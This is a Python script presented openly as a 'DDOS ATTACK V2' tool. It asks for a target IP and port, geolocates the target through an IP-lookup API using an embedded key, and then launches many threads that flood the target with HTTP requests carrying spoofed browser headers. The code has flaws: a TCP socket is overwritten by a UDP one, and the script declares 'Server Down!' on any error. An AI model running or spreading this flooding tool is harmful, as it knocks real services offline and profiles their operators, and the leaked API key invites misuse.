import os, socket, random, time, subprocess, threading
from termcolor import colored
import rich
from rich import print
import datetime
from datetime import date
import requests
import webbrowser
import colorama
from colorama import Fore, Back, Style
time.sleep(2)
subprocess.run('clear' , shell=True)
print("""[bold red]╔═══╦═══╦═══╦═══╗╔═══╦════╦════╦═══╦═══╦╗╔═╗╔╗──╔╦═══╗
╚╗╔╗╠╗╔╗║╔═╗║╔═╗║║╔═╗║╔╗╔╗║╔╗╔╗║╔═╗║╔═╗║║║╔╝║╚╗╔╝║╔═╗║
─║║║║║║║║║─║║╚══╗║║─║╠╝║║╚╩╝║║╚╣║─║║║─╚╣╚╝╝─╚╗║║╔╩╝╔╝║
─║║║║║║║║║─║╠══╗║║╚═╝║─║║───║║─║╚═╝║║─╔╣╔╗║──║╚╝║╔═╝╔╝
╔╝╚╝╠╝╚╝║╚═╝║╚═╝║║╔═╗║─║║───║║─║╔═╗║╚═╝║║║╚╗─╚╗╔╝║║╚═╗
╚═══╩═══╩═══╩═══╝╚╝─╚╝─╚╝───╚╝─╚╝─╚╩═══╩╝╚═╝──╚╝─╚═══╝
[/bold red]""")
print("[bold cyan]🔺️ DDOS ATTACK V2 🔺️[/bold cyan]")
Todaydate = datetime.datetime.now()
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

time.sleep(2)
ip = str(input(Fore.RED + '[+] IP: '))
port = int(input(Fore.RED + '[+] PORT: '))
print("[bold red][*] SLOW-2 0.4 | SLOW-1 0.3 | MEDIUM 0.2 | FAST-2 0.1 | FAST-1 0.0[/bold red]")
sleep = float(input(Fore.RED + '[*] SLEEP: '))
pack = int(input(Fore.RED + '[+] PACKET/s: '))
thread = int(input(Fore.RED + '[+] THREAD: '))

print("[bold red][x] Attack starting on ( "+ip+" ) [/bold red]")
time.sleep(1)
print("[bold red][x] Getting information on "+ip+"[/bold red]")
time.sleep(5)
print("[blue]----------------------------------------------------------[/blue]")
key="4655b4f97a4148fe84d46ca2bfdee047"
api = "https://vpnapi.io/api/"+ip+"?key="+key+""
response=requests.get(api)
data=response.json()
ip = data["ip"]
vpn = data["security"]["vpn"]
proxy = data["security"]["proxy"]
tor = data["security"]["tor"]
city = data["location"]["city"]
region = data["location"]["region"]
country = data["location"]["country"]
continent = data["location"]["continent"]
region_code = data["location"]["region_code"]
country_code = data["location"]["country_code"]
continent_code = data["location"]["continent_code"]
latitude = data["location"]["latitude"]
longitude = data["location"]["longitude"]
time_zone = data["location"]["time_zone"]
locale_code = data["location"]["locale_code"]
metro_code = data["location"]["metro_code"]
is_in_european_union = data["location"]["is_in_european_union"]
network = data["network"]["network"]
autonomous_system_number = data["network"]["autonomous_system_number"]
autonomous_system_organization = data["network"]["autonomous_system_organization"]
print(f"[bold red][+] IP: {ip}[/bold red]")
print(f"[bold red][+] VPN: {vpn}[/bold red]")
print(f"[bold red][+] Proxy: {proxy}[/bold red]")
print(f"[bold red][+] TOR: {tor}[/bold red]")
print(f"[bold red][+] City: {city}[/bold red]")
print(f"[bold red][+] Region: {region}[/bold red]")
print(f"[bold red][+] Country: {country}[/bold red]")
print(f"[bold red][+] Continent: {continent}[/bold red]")
print(f"[bold red][+] Region code: {region_code}[/bold red]")
print(f"[bold red][+] Country code: {country_code}[/bold red]")
print(f"[bold red][+] Continent code: {continent_code}[/bold red]")
print(f"[bold red][+] Latitude: {latitude}[/bold red]")
print(f"[bold red][+] Longitude: {longitude}[/bold red]")
print(f"[bold red][+] Time Zone: {time_zone}[/bold red]")
print(f"[bold red][+] Locale Code: {locale_code}[/bold red]")
print(f"[bold red][+] Metro Code: {metro_code}[/bold red]")
print(f"[bold red][+] Is In European Union: {is_in_european_union}[/bold red]")
print(f"[bold red][+] Network: {network}[/bold red]")
print(f"[bold red][+] Autonomous System Number: {autonomous_system_number}[/bold red]")
print(f"[bold red][+] Autonomous System Organization: {autonomous_system_organization}[/bold red]")
print("[blue]----------------------------------------------------------[/blue]")
time.sleep(1)
print("[bold red][x] STARTING ATTACK...[/bold red]")
time.sleep(7)

def start():
    global useragents, ref, acceptall
    hh = random._urandom(3016)
    xx = int(0)
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req  = target_host + useragen + accept + reffer + content + length
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            time.sleep(sleep)
            print("[blue][+][/blue][yellow] PACKET sent [ {0}:{1} ]  | Sent: {2}[/yellow]".format(str(ip), int(port), xx))
        except:
            s.close()
            print("[bold green][+] Server Down![/bold green] [yellow]sent PACKET to>[/yellow] [bold red]"+ip+"[/bold red]")

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
